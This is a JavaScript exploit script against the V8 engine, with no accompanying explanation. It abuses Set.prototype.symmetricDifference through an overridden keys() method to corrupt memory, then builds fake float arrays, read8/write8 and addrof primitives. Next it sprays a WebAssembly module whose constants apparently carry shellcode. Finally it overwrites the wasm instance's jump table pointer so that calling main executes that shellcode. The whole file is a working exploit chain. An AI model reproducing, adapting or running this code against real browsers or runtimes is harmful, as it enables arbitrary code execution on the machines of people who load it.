// flags: --harmony (or --harmony-set-methods)

let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

// convert float to bigint
function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

// convert bigint to float
function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

// convert int to hex string
function hex(i) {
    return `0x${i.toString(16)}`;
}


let a = new Set([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31]); // elements: 32 / capacity: 32
let b = new Set();

let float_arr_struct;
let map = 0x18efb1n; // PACKED_DOUBLE_ELEMENTS
let properties = 0x6cdn; // FixedArray[0]
let elements = 0x4a001n; // starting address for scanning
let len = 0x1n << 1n; // 1 (SMI)

let tmp_obj = {};
let obj_arr;

b.keys = () => {
    float_arr_struct = [1.1, 2.2, 3.3];
    a.add(32); // elements: 33 / capacity: 64 (allocate new table for `a`)
    obj_arr = [tmp_obj];

    return b[Symbol.iterator](); // `b.keys()` must return set iterator
}

let s = a.symmetricDifference(b);
for (let i = 0; i < 0x10; i++) { s.delete(i); } // elements: 17 / capacity: 64

float_arr_struct[1] = itof(map + (properties << 32n));
float_arr_struct[2] = itof(elements + (len << 32n));

let float_arr = s.size;

// read 8-byte from `addr` in sandbox
function read8(addr) {
    float_arr_struct[2] = itof(addr - 0x8n + (len << 32n));
    return ftoi(float_arr[0]);
}

// write 8-byte `value` to `addr` in sandbox
function write8(addr, value) {
    float_arr_struct[2] = itof(addr - 0x8n + (len << 32n));
    float_arr[0] = itof(value);
}

// scan for memory to get address of `float_arr`
let marker = 0x123456789abcdef0n;
float_arr_struct[0] = itof(marker);
while (read8(elements) != marker) { elements += 0x4n; }

let flaot_arr_addr = elements + 0x8n;
console.log(`[+] float_arr_addr == ${hex(flaot_arr_addr)}`);

let obj_arr_addr = flaot_arr_addr + 0x2c0n;
console.log(`[+] obj_arr_addr == ${hex(obj_arr_addr)}`);

// get (compressed) address of `obj`
function addrof(obj) {
    obj_arr[0] = obj;
    return read8(obj_arr_addr - 0x4n) & 0xffffffffn;
}


// jit spraying
console.log("[+] JIT spraying...");
let wasm_src = new Uint8Array([0x0, 0x61, 0x73, 0x6d, 0x1, 0x0, 0x0, 0x0, 0x1, 0x4, 0x1, 0x60, 0x0, 0x0, 0x3, 0x2, 0x1, 0x0, 0x7, 0x8, 0x1, 0x4, 0x6d, 0x61, 0x69, 0x6e, 0x0, 0x0, 0xa, 0xb1, 0x1, 0x1, 0xae, 0x1, 0x0, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xb2, 0x9b, 0x86, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0xdf, 0xe0, 0x9b, 0x96, 0x8c, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x82, 0x83, 0x87, 0x82, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0x8a, 0xbc, 0x91, 0x96, 0xcd, 0xdb, 0xf5, 0x2, 0x42, 0xd0, 0x90, 0xa5, 0xbc, 0x8e, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xc8, 0xe2, 0xd8, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0x90, 0x91, 0xc5, 0x81, 0x8c, 0x92, 0xe4, 0xf5, 0x2, 0x42, 0xe6, 0xf0, 0xea, 0x81, 0x83, 0x8a, 0xe4, 0xf5, 0x2, 0x42, 0xb8, 0x99, 0x85, 0xca, 0xd5, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x90, 0x91, 0x85, 0x86, 0x8e, 0x84, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x8a, 0x90, 0xca, 0xb4, 0x8a, 0xd4, 0xf5, 0x6, 0x42, 0xd0, 0x90, 0xa5, 0x84, 0x8e, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0xec, 0x9e, 0x85, 0x8a, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0x92, 0x8a, 0x87, 0x89, 0x92, 0xe4, 0xf5, 0x6, 0x42, 0xc8, 0xe2, 0x80, 0x86, 0xbb, 0x87, 0xe4, 0xf5, 0x6, 0x42, 0x8f, 0x8a, 0xc0, 0x84, 0x89, 0x92, 0xa4, 0xc8, 0x90, 0x7f, 0xf, 0xb]); // output of wasm.py
let wasm_module = new WebAssembly.Module(wasm_src);

let wasm_instance = new WebAssembly.Instance(wasm_module);
let wasm_instance_addr = addrof(wasm_instance);
console.log(`[+] wasm_instance_addr == ${hex(wasm_instance_addr)}`);

let jump_table_start = read8(wasm_instance_addr + 0x48n);
console.log(`[+] jump_table_start == ${hex(jump_table_start)}`);

// overwrite jump_table_start with address of shellcode
write8(wasm_instance_addr + 0x48n, jump_table_start + 0x81an);

// execute shellcode
console.log("[+] Executing shellcode...");
wasm_instance.exports.main(); // lazy compilation
